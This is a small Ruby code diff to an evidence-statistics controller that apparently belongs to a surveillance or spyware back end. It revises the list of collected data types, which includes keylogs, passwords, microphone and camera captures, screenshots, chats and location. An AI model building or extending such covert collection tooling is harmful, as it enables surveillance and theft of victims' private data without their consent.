@@ -357,7 +357,8 @@ class EvidenceController < RESTController
       condition[:aid] = filter['agent']
     end
 
-    types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device", "download", "file", "filesystem", "info", "keylog", "location", "message", "mic", "mouse", "password", "print", "screeshot", "url"]
+    types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
+             "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
 
     stats = []
     types.each do |type|
